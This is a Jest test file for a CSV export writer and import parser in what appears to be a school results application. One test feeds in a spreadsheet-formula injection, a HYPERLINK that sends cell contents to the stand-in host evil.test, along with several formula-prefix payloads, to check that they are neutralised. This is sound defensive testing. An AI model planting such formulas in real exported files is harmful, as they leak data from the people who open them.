import { csvRecords, parseCsv } from './parse-csv';
import { safeSpreadsheetCell, toCsv, withBom } from './to-csv';

/**
 * CSV underpins both the §2.14 result exports and the §2.10 student import, so
 * the writer and reader are tested against the RFC 4180 edge cases that bite in
 * practice (commas and quotes inside names, embedded newlines, CRLF, BOM).
 */
describe('toCsv (export writer, §2.14)', () => {
  it('writes a header row and data rows separated by CRLF', () => {
    const csv = toCsv(['a', 'b'], [[1, 2]]);
    expect(csv).toBe('a,b\r\n1,2');
  });

  it('quotes fields containing a comma', () => {
    expect(toCsv(['name'], [['Roy, Jr']])).toBe('name\r\n"Roy, Jr"');
  });

  it('escapes embedded double quotes by doubling them', () => {
    expect(toCsv(['name'], [['He said "hi"']])).toBe(
      'name\r\n"He said ""hi"""',
    );
  });

  it('quotes fields containing newlines', () => {
    expect(toCsv(['note'], [['line1\nline2']])).toBe('note\r\n"line1\nline2"');
  });

  it('renders null and undefined as empty cells', () => {
    expect(toCsv(['a', 'b'], [[null, undefined]])).toBe('a,b\r\n,');
  });

  it('prefixes a UTF-8 BOM so Excel detects the encoding', () => {
    expect(withBom('a,b')).toBe('﻿a,b');
  });

  it('turns a formula in a name into plain text', () => {
    const attack = '=HYPERLINK("http://evil.test?x="&A1,"Click")';
    const [, cell] = toCsv(['name'], [[attack]]).split('\r\n');
    expect(cell).toBe(`"'=HYPERLINK(""http://evil.test?x=""&A1,""Click"")"`);
    expect(parseCsv(`name\r\n${cell}`)[1][0]).toBe(`'${attack}`);
  });

  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1', '  =1+1'])(
    'neutralises %j',
    (value) => {
      expect(safeSpreadsheetCell(value)).toBe(`'${value}`);
    },
  );

  it('leaves numbers and ordinary text alone', () => {
    expect(toCsv(['n'], [[-5]])).toBe('n\r\n-5');
    expect(toCsv(['n'], [['-5']])).toBe('n\r\n-5');
    expect(toCsv(['n'], [['-12.50']])).toBe('n\r\n-12.50');
    expect(toCsv(['n'], [['+91']])).toBe('n\r\n+91');
    expect(toCsv(['n'], [['2026-11-01']])).toBe('n\r\n2026-11-01');
    expect(toCsv(['n'], [['a@b.io']])).toBe('n\r\na@b.io');
    expect(toCsv(['n'], [["O'Brien"]])).toBe("n\r\nO'Brien");
    expect(safeSpreadsheetCell(null)).toBeNull();
    expect(safeSpreadsheetCell(true)).toBe(true);
  });

  it('quotes a semicolon so a locale that splits on it keeps one cell', () => {
    expect(toCsv(['n'], [['a;=1+1']])).toBe('n\r\n"a;=1+1"');
  });
});

describe('parseCsv (import reader, §2.10)', () => {
  it('parses simple rows', () => {
    expect(parseCsv('a,b\n1,2')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  it('parses quoted fields containing commas', () => {
    expect(parseCsv('name\n"Roy, Jr"')).toEqual([['name'], ['Roy, Jr']]);
  });

  it('unescapes doubled quotes', () => {
    expect(parseCsv('name\n"He said ""hi"""')).toEqual([
      ['name'],
      ['He said "hi"'],
    ]);
  });

  it('parses quoted fields containing newlines', () => {
    expect(parseCsv('note\n"line1\nline2"')).toEqual([
      ['note'],
      ['line1\nline2'],
    ]);
  });

  it('handles CRLF line endings', () => {
    expect(parseCsv('a,b\r\n1,2')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  it('strips a leading BOM (file exported from Excel)', () => {
    expect(parseCsv('﻿a,b\n1,2')[0]).toEqual(['a', 'b']);
  });

  it('does not emit a trailing empty row for a trailing newline', () => {
    expect(parseCsv('a\n1\n')).toEqual([['a'], ['1']]);
  });
});

describe('csvRecords', () => {
  it('keys cells by lower-cased, trimmed headers', () => {
    expect(csvRecords('Name, Email \nAsha, a@x.io')).toEqual([
      { name: 'Asha', email: 'a@x.io' },
    ]);
  });

  it('skips fully blank lines', () => {
    expect(csvRecords('name\nAsha\n\nBen')).toEqual([
      { name: 'Asha' },
      { name: 'Ben' },
    ]);
  });

  it('returns [] when there is no data', () => {
    expect(csvRecords('')).toEqual([]);
  });

  it('fills missing trailing cells with empty strings', () => {
    expect(csvRecords('name,email\nAsha')).toEqual([
      { name: 'Asha', email: '' },
    ]);
  });
});

describe('round-trip', () => {
  it('parseCsv(toCsv(x)) preserves nasty values', () => {
    const headers = ['name', 'note'];
    const rows = [
      ['Roy, Jr', 'He said "hi"'],
      ['plain', 'line1\nline2'],
    ];
    expect(parseCsv(toCsv(headers, rows))).toEqual([headers, ...rows]);
  });
});
